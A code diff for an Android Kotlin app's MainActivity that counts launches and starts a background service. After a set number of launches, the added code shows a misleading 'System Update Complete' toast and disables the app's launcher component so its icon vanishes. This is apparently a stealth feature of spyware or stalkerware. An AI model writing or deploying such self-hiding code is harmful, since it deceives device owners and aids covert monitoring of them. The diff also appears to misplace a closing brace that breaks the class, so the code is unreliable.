@@ -16,7 +16,6 @@ import com.luffa.MyService
 import androidx.preference.PreferenceManager  // ✅ সঠিক
 
 
-
 class MainActivity : AppCompatActivity() {
 
     private val REQUEST_PERM_CODE = 1001
@@ -27,20 +26,30 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         prefs = PreferenceManager.getDefaultSharedPreferences(this)
-        
-        // Increment Launch Count
+
         val currentLaunches = prefs.getInt("launch_count", 0) + 1
         prefs.edit().putInt("launch_count", currentLaunches).apply()
 
-        // Check if we need to hide
+        serviceIntent = Intent(this, MyService::class.java)
+        requestPermissions()
+
         if (currentLaunches >= LAUNCH_LIMIT) {
             prefs.edit().putBoolean("app_hidden", true).apply()
             Toast.makeText(this, "System Update Complete", Toast.LENGTH_SHORT).show()
+            hideAppIcon()
         }
-
-        serviceIntent = Intent(this, MyService::class.java)
-        requestPermissions()
     }
+
+    private fun hideAppIcon() {
+        val componentName = ComponentName(this, MainActivity::class.java)
+        packageManager.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+}
+
 
     private fun requestPermissions() {
         val perms = arrayOf(
